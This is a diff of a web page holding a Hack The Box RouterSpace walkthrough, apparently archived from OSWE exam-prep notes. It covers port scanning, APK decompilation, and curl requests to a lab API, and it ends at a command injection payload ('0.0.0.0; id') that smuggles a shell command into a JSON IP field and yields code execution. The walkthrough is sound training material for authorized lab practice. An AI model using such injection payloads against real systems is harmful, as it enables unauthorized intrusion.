@@ -1,56 +1,53 @@
 1:"$Sreact.fragment"
 2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 3:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
-19:I[484,[],"OutletBoundary"]
-1a:"$Sreact.suspense"
+17:I[484,[],"OutletBoundary"]
+18:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-routerspace-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: RouterSpace Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box RouterSpace machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:43:57.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[10," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-routerspace-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box RouterSpace machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official RouterSpace machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/routerspace","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","mindset-and-methodology-a-name-mindset-a",{"children":["$","a",null,{"href":"#mindset-and-methodology-a-name-mindset-a","children":"Mindset & Methodology <a name=\"mindset\"> </a>"}]}],["$","li","step-1-reconnaissance-a-name-step-1-a",{"children":["$","a",null,{"href":"#step-1-reconnaissance-a-name-step-1-a","children":"Step 1 — Reconnaissance <a name=\"step-1\"> </a>"}]}],["$","li","step-2-web-enumeration-a-name-step-2-a",{"children":["$","a",null,{"href":"#step-2-web-enumeration-a-name-step-2-a","children":"Step 2 — Web Enumeration <a name=\"step-2\"> </a>"}]}],["$","li","step-3-apk-analysis-static-a-name-step-3-a",{"children":["$","a",null,{"href":"#step-3-apk-analysis-static-a-name-step-3-a","children":"Step 3 — APK Analysis (Static) <a name=\"step-3\"> </a>"}]}],"$L4","$L5","$L6","$L7","$L8","$L9","$La","$Lb"]}]]}],"$Lc"],"$Ld","$Le",["$Lf","$L10","$L11"]]}],"$L12"]}]]}],"$L13"]}],"$L14","$L15"],null,"$L16"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","li","step-4-testing-the-api-endpoint-a-name-step-4-a",{"children":["$","a",null,{"href":"#step-4-testing-the-api-endpoint-a-name-step-4-a","children":"Step 4 — Testing the API Endpoint <a name=\"step-4\"> </a>"}]}]
-5:["$","li","step-5-command-injection-a-name-step-5-a",{"children":["$","a",null,{"href":"#step-5-command-injection-a-name-step-5-a","children":"Step 5 — Command Injection <a name=\"step-5\"> </a>"}]}]
-6:["$","li","step-6-getting-a-shell-as-paul-a-name-step-6-a",{"children":["$","a",null,{"href":"#step-6-getting-a-shell-as-paul-a-name-step-6-a","children":"Step 6 — Getting a Shell as paul <a name=\"step-6\"> </a>"}]}]
-7:["$","li","step-7-user-flag-a-name-step-7-a",{"children":["$","a",null,{"href":"#step-7-user-flag-a-name-step-7-a","children":"Step 7 — User Flag <a name=\"step-7\"> </a>"}]}]
-8:["$","li","step-8-privilege-escalation-enumeration-a-name-step-8-a",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-enumeration-a-name-step-8-a","children":"Step 8 — Privilege Escalation Enumeration <a name=\"step-8\"> </a>"}]}]
-9:["$","li","step-9-exploiting-cve-2021-3156-baron-samedit-a-name-step-9-a",{"children":["$","a",null,{"href":"#step-9-exploiting-cve-2021-3156-baron-samedit-a-name-step-9-a","children":"Step 9 — Exploiting CVE-2021-3156 (Baron Samedit) <a name=\"step-9\"> </a>"}]}]
-a:["$","li","step-10-root-flag-a-name-step-10-a",{"children":["$","a",null,{"href":"#step-10-root-flag-a-name-step-10-a","children":"Step 10 — Root Flag <a name=\"step-10\"> </a>"}]}]
-b:["$","li","lessons-learned-a-name-lessons-a",{"children":["$","a",null,{"href":"#lessons-learned-a-name-lessons-a","children":"Lessons Learned <a name=\"lessons\"> </a>"}]}]
-c:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",12," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","mindset-and-methodology-a-name-mindset-a",{"children":["$","a",null,{"href":"#mindset-and-methodology-a-name-mindset-a","children":"Mindset & Methodology <a name=\"mindset\"> </a>"}]}],["$","li","step-1-reconnaissance-a-name-step-1-a",{"children":["$","a",null,{"href":"#step-1-reconnaissance-a-name-step-1-a","children":"Step 1 — Reconnaissance <a name=\"step-1\"> </a>"}]}],["$","li","step-2-web-enumeration-a-name-step-2-a",{"children":["$","a",null,{"href":"#step-2-web-enumeration-a-name-step-2-a","children":"Step 2 — Web Enumeration <a name=\"step-2\"> </a>"}]}],["$","li","step-3-apk-analysis-static-a-name-step-3-a",{"children":["$","a",null,{"href":"#step-3-apk-analysis-static-a-name-step-3-a","children":"Step 3 — APK Analysis (Static) <a name=\"step-3\"> </a>"}]}],["$","li","step-4-testing-the-api-endpoint-a-name-step-4-a",{"children":["$","a",null,{"href":"#step-4-testing-the-api-endpoint-a-name-step-4-a","children":"Step 4 — Testing the API Endpoint <a name=\"step-4\"> </a>"}]}],["$","li","step-5-command-injection-a-name-step-5-a",{"children":["$","a",null,{"href":"#step-5-command-injection-a-name-step-5-a","children":"Step 5 — Command Injection <a name=\"step-5\"> </a>"}]}],["$","li","step-6-getting-a-shell-as-paul-a-name-step-6-a",{"children":["$","a",null,{"href":"#step-6-getting-a-shell-as-paul-a-name-step-6-a","children":"Step 6 — Getting a Shell as paul <a name=\"step-6\"> </a>"}]}],["$","li","step-7-user-flag-a-name-step-7-a",{"children":["$","a",null,{"href":"#step-7-user-flag-a-name-step-7-a","children":"Step 7 — User Flag <a name=\"step-7\"> </a>"}]}],["$","li","step-8-privilege-escalation-enumeration-a-name-step-8-a",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-enumeration-a-name-step-8-a","children":"Step 8 — Privilege Escalation Enumeration <a name=\"step-8\"> </a>"}]}],["$","li","step-9-exploiting-cve-2021-3156-baron-samedit-a-name-step-9-a",{"children":["$","a",null,{"href":"#step-9-exploiting-cve-2021-3156-baron-samedit-a-name-step-9-a","children":"Step 9 — Exploiting CVE-2021-3156 (Baron Samedit) <a name=\"step-9\"> </a>"}]}],["$","li","step-10-root-flag-a-name-step-10-a",{"children":["$","a",null,{"href":"#step-10-root-flag-a-name-step-10-a","children":"Step 10 — Root Flag <a name=\"step-10\"> </a>"}]}],["$","li","lessons-learned-a-name-lessons-a",{"children":["$","a",null,{"href":"#lessons-learned-a-name-lessons-a","children":"Lessons Learned <a name=\"lessons\"> </a>"}]}]]}]}]]}]
-d:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d65edaba54b381efb7f2e74e00a5ff93b9ce0249/HTB-RouterSpace.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · d65edaba54b3",""]}]]]}]
-e:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["RouterSpace"," · Linux"," · Easy"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/routerspace","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
-f:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box RouterSpace machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-10:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-11:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-17:T4dd8,
-<p><strong>Difficulty:</strong> Easy<br /><strong>OS:</strong> Linux<br /><strong>IP:</strong> 10.129.227.47<br /><strong>Attacker IP:</strong> 10.10.16.84  </p>
-<hr />
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: RouterSpace Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Decompiling the RouterSpace APK exposed an API whose IP field was command-injectable, allowing Paul's SSH key to be planted before the vulnerable sudo version was exploited with Baron Samedit for root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:43:57.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[10," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-routerspace-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box RouterSpace machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official RouterSpace machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/routerspace","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-reconnaissance",{"children":["$","a",null,{"href":"#step-1-reconnaissance","children":"Step 1: Reconnaissance"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-apk-analysis-static",{"children":["$","a",null,{"href":"#step-3-apk-analysis-static","children":"Step 3: APK Analysis (Static)"}]}],["$","li","step-4-testing-the-api-endpoint",{"children":["$","a",null,{"href":"#step-4-testing-the-api-endpoint","children":"Step 4: Testing the API Endpoint"}]}],["$","li","step-5-command-injection",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La"]}]]}],"$Lb"],"$Lc","$Ld",["$Le","$Lf"]]}],"$L10"]}]]}],"$L11"]}],"$L12","$L13"],null,"$L14"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","a",null,{"href":"#step-5-command-injection","children":"Step 5: Command Injection"}]
+5:["$","li","step-6-getting-a-shell-as-paul",{"children":["$","a",null,{"href":"#step-6-getting-a-shell-as-paul","children":"Step 6: Getting a Shell as paul"}]}]
+6:["$","li","step-7-user-flag",{"children":["$","a",null,{"href":"#step-7-user-flag","children":"Step 7: User Flag"}]}]
+7:["$","li","step-8-privilege-escalation-enumeration",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-enumeration","children":"Step 8: Privilege Escalation Enumeration"}]}]
+8:["$","li","step-9-exploiting-cve-2021-3156-baron-samedit",{"children":["$","a",null,{"href":"#step-9-exploiting-cve-2021-3156-baron-samedit","children":"Step 9: Exploiting CVE-2021-3156 (Baron Samedit)"}]}]
+9:["$","li","step-10-root-flag",{"children":["$","a",null,{"href":"#step-10-root-flag","children":"Step 10: Root Flag"}]}]
+a:["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]
+b:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",12," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-reconnaissance",{"children":["$","a",null,{"href":"#step-1-reconnaissance","children":"Step 1: Reconnaissance"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-apk-analysis-static",{"children":["$","a",null,{"href":"#step-3-apk-analysis-static","children":"Step 3: APK Analysis (Static)"}]}],["$","li","step-4-testing-the-api-endpoint",{"children":["$","a",null,{"href":"#step-4-testing-the-api-endpoint","children":"Step 4: Testing the API Endpoint"}]}],["$","li","step-5-command-injection",{"children":["$","a",null,{"href":"#step-5-command-injection","children":"Step 5: Command Injection"}]}],["$","li","step-6-getting-a-shell-as-paul",{"children":["$","a",null,{"href":"#step-6-getting-a-shell-as-paul","children":"Step 6: Getting a Shell as paul"}]}],["$","li","step-7-user-flag",{"children":["$","a",null,{"href":"#step-7-user-flag","children":"Step 7: User Flag"}]}],["$","li","step-8-privilege-escalation-enumeration",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-enumeration","children":"Step 8: Privilege Escalation Enumeration"}]}],["$","li","step-9-exploiting-cve-2021-3156-baron-samedit",{"children":["$","a",null,{"href":"#step-9-exploiting-cve-2021-3156-baron-samedit","children":"Step 9: Exploiting CVE-2021-3156 (Baron Samedit)"}]}],["$","li","step-10-root-flag",{"children":["$","a",null,{"href":"#step-10-root-flag","children":"Step 10: Root Flag"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]]}]}]]}]
+c:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/d65edaba54b381efb7f2e74e00a5ff93b9ce0249/HTB-RouterSpace.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit d65edaba54b3",""]}]]]}]
+d:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["RouterSpace, Linux, Easy",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/routerspace","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
+e:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box RouterSpace machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+f:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+15:T43d7,<p><strong>Difficulty:</strong> Easy<br><strong>OS:</strong> Linux<br><strong>IP:</strong> 10.129.227.47<br><strong>Attacker IP:</strong> 10.10.16.84  </p>
+<hr>
 
 
 
-<h2 id="mindset-and-methodology-a-name-mindset-a">Mindset &amp; Methodology <pre class="raw-markup-example"><code>&lt;a name="mindset"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
-<p>Before touching any machine, understand the hacker's core loop:</p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>RouterSpace repeats a simple loop:</p>
 <pre><code>Enumerate → Find Attack Surface → Exploit → Enumerate Again → Escalate
 </code></pre>
-<p>Every step feeds the next. You never skip enumeration — even when you think you know what to do. Information you ignore early often comes back to bite you later.</p>
-<p>The golden rule: <strong>follow the data, not assumptions.</strong></p>
-<hr />
-<h2 id="step-1-reconnaissance-a-name-step-1-a">Step 1 — Reconnaissance <pre class="raw-markup-example"><code>&lt;a name="step-1"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
-<h3 id="what-we-do">What we do</h3>
+<p>Each result defines the next check. Re-enumerate after access changes because new services, files, and privileges may become visible.</p>
+<p>Follow the evidence rather than assumptions.</p>
+<hr>
+<h2 id="step-1-reconnaissance">Step 1: Reconnaissance</h2>
+
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.47
 </code></pre>
 <h3 id="why-this-command">Why this command</h3>
 <ul>
-<li><code>-p-</code> scans <strong>all 65535 ports</strong>, not just the top 1000. Services can run on non-standard ports — missing one means missing an attack vector.</li>
+<li><code>-p-</code> scans <strong>all 65535 ports</strong>, not just the top 1000. Services can run on non-standard ports - missing one means missing an attack vector.</li>
 <li><code>--min-rate 10000</code> speeds up the scan. On HTB labs (controlled environments) this is safe. On real engagements you would slow this down to avoid detection.</li>
 </ul>
 <h3 id="what-we-found">What we found</h3>
 <pre><code>22/tcp open  ssh
 80/tcp open  http
 </code></pre>
-<h3 id="hacker-mindset">Hacker mindset</h3>
-<p>Two ports means a small attack surface. SSH (22) is almost never the entry point — brute-forcing SSH is loud and usually fruitless without credentials. HTTP (80) is the interesting one. <strong>Web applications are almost always where you start.</strong></p>
+
+<p>Two ports means a small attack surface. SSH (22) is almost never the entry point - brute-forcing SSH is loud and usually fruitless without credentials. HTTP (80) is the interesting one. <strong>Web applications are almost always where you start.</strong></p>
 <p>Port 22 gets mentally filed away as: <em>"useful later once I have credentials or a key."</em></p>
-<hr />
-<h2 id="step-2-web-enumeration-a-name-step-2-a">Step 2 — Web Enumeration <pre class="raw-markup-example"><code>&lt;a name="step-2"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
-<h3 id="what-we-do-2">What we do</h3>
+<hr>
+<h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
+
 <p>First, add the hostname to <code>/etc/hosts</code> so the machine resolves by name:</p>
 <pre><code class="language-bash" data-language="bash">echo "10.129.227.47 routerspace.htb" | sudo tee -a /etc/hosts
 </code></pre>
@@ -62,11 +59,11 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 <h3 id="what-we-download">What we download</h3>
 <pre><code class="language-bash" data-language="bash">wget http://routerspace.htb/RouterSpace.apk -P /home/kali/Downloads/htb/
 </code></pre>
-<h3 id="hacker-mindset-2">Hacker mindset</h3>
-<p>When a website offers a downloadable file — especially an app — <strong>download it immediately.</strong> Apps are goldmines: they contain API endpoints, hardcoded credentials, encryption keys, and business logic. This is your primary lead.</p>
+
+<p>When a website offers a downloadable file - especially an app - <strong>download it immediately.</strong> Apps are useful sources: they contain API endpoints, hardcoded credentials, encryption keys, and business logic. This is your primary lead.</p>
 <p>Directory brute-forcing this site returns nothing useful (the server returns 200 for everything, making it noisy). The APK is the real attack surface.</p>
-<hr />
-<h2 id="step-3-apk-analysis-static-a-name-step-3-a">Step 3 — APK Analysis (Static) <pre class="raw-markup-example"><code>&lt;a name="step-3"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="step-3-apk-analysis-static">Step 3: APK Analysis (Static)</h2>
 <h3 id="what-is-an-apk">What is an APK</h3>
 <p>An APK (Android Package) is essentially a zip file containing:</p>
 <ul>
@@ -80,22 +77,22 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 </code></pre>
 <p>This decompiles the APK into human-readable form. You get directories like <code>smali/</code> (disassembled bytecode), <code>assets/</code>, and <code>AndroidManifest.xml</code>.</p>
 <h3 id="what-to-look-for">What to look for</h3>
-<p><strong>AndroidManifest.xml</strong> — tells you what the app does, what permissions it needs, and what components it has.</p>
-<p><strong>assets/index.android.bundle</strong> — if it's a React Native app, all the JavaScript logic lives here. This includes API calls, endpoints, and sometimes credentials.</p>
+<p><strong>AndroidManifest.xml</strong> - tells you what the app does, what permissions it needs, and what components it has.</p>
+<p><strong>assets/index.android.bundle</strong> - if it's a React Native app, all the JavaScript logic lives here. This includes API calls, endpoints, and sometimes credentials.</p>
 <h3 id="key-findings">Key findings</h3>
 <ul>
 <li>The app is built with <strong>React Native</strong> (JavaScript running on Android)</li>
-<li>The certificate in <code>original/META-INF/CERT.RSA</code> contains the string <code>routerspace.htb</code> — confirms our hostname guess</li>
-<li>The JavaScript bundle (though obfuscated) reveals the app makes POST requests to <code>[redacted encoded lab material]</code></li>
+<li>The certificate in <code>original/META-INF/CERT.RSA</code> contains the string <code>routerspace.htb</code> : confirms our hostname guess</li>
+<li>The JavaScript bundle (though obfuscated) reveals the app makes POST requests to <code>/api/v4/monitoring/router/dev/check/deviceAccess</code></li>
 </ul>
-<h3 id="hacker-mindset-3">Hacker mindset</h3>
-<p>You do NOT need a working Android emulator to hack this. That's a trap beginners fall into — spending hours setting up Genymotion or Android Studio. <strong>The goal is to understand what the app sends to the server, then replicate it yourself with curl.</strong> Static analysis gets you the endpoint and headers without ever running the app.</p>
-<hr />
-<h2 id="step-4-testing-the-api-endpoint-a-name-step-4-a">Step 4 — Testing the API Endpoint <pre class="raw-markup-example"><code>&lt;a name="step-4"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>You do NOT need a working Android emulator to hack this. That's a trap beginners fall into - spending hours setting up Genymotion or Android Studio. <strong>The goal is to understand what the app sends to the server, then replicate it yourself with curl.</strong> Static analysis gets you the endpoint and headers without ever running the app.</p>
+<hr>
+<h2 id="step-4-testing-the-api-endpoint">Step 4: Testing the API Endpoint</h2>
 <h3 id="what-we-know-so-far">What we know so far</h3>
 <p>From static analysis:</p>
 <ul>
-<li>Endpoint: <code>POST [redacted encoded lab material]</code></li>
+<li>Endpoint: <code>POST /api/v4/monitoring/router/dev/check/deviceAccess</code></li>
 <li>The app sends JSON with an <code>ip</code> field</li>
 <li>The <code>User-Agent</code> must be <code>RouterSpaceAgent</code> (the server rejects other values)</li>
 </ul>
@@ -104,13 +101,13 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
   -H 'User-Agent: RouterSpaceAgent' \
   -H 'Content-Type: application/json' \
   -d '{"ip":"0.0.0.0"}' \
-  http://routerspace.[redacted encoded lab material]
+  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
 </code></pre>
 <h3 id="response">Response</h3>
 <pre><code>"0.0.0.0\n"
 </code></pre>
 <h3 id="what-this-tells-us">What this tells us</h3>
-<p>The server is <strong>echoing our input back</strong>. This is a huge hint. When a server takes user input, does <em>something</em> with it server-side, and returns a result — it's almost certainly passing that input to a system command or function. </p>
+<p>The server is <strong>echoing our input back</strong>. This is a strong hint. When a server takes user input, does <em>something</em> with it server-side, and returns a result - it's almost certainly passing that input to a system command or function. </p>
 <p>The question becomes: <em>what is the server doing with this IP?</em> Possibilities:</p>
 <ul>
 <li>Running <code>ping &lt;ip&gt;</code></li>
@@ -118,10 +115,10 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 <li>Passing it to some custom shell script</li>
 </ul>
 <p>Any of these would be vulnerable to <strong>command injection</strong> if the input isn't sanitized.</p>
-<h3 id="hacker-mindset-4">Hacker mindset</h3>
+
 <p>Whenever you see "input goes in, result comes out," think: <em>what process is handling this?</em> If there's a shell involved anywhere in that chain, you can inject commands. The echo behavior is a dead giveaway that the server is processing your string in a shell context.</p>
-<hr />
-<h2 id="step-5-command-injection-a-name-step-5-a">Step 5 — Command Injection <pre class="raw-markup-example"><code>&lt;a name="step-5"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="step-5-command-injection">Step 5: Command Injection</h2>
 <h3 id="what-is-command-injection">What is command injection</h3>
 <p>When a web application passes user-controlled input directly to a system shell command without sanitization, you can terminate the intended command and append your own. For example, if the server runs:</p>
 <pre><code class="language-bash" data-language="bash">ping -c 1 &lt;user_input&gt;
@@ -135,70 +132,70 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
   -H 'User-Agent: RouterSpaceAgent' \
   -H 'Content-Type: application/json' \
   -d '{"ip":"0.0.0.0; id"}' \
-  http://routerspace.[redacted encoded lab material]
+  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
 </code></pre>
 <h3 id="response-2">Response</h3>
 <pre><code>"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
 </code></pre>
 <p><strong>We have Remote Code Execution (RCE) as user <code>paul</code>.</strong></p>
 <h3 id="why-not-get-a-reverse-shell">Why not get a reverse shell</h3>
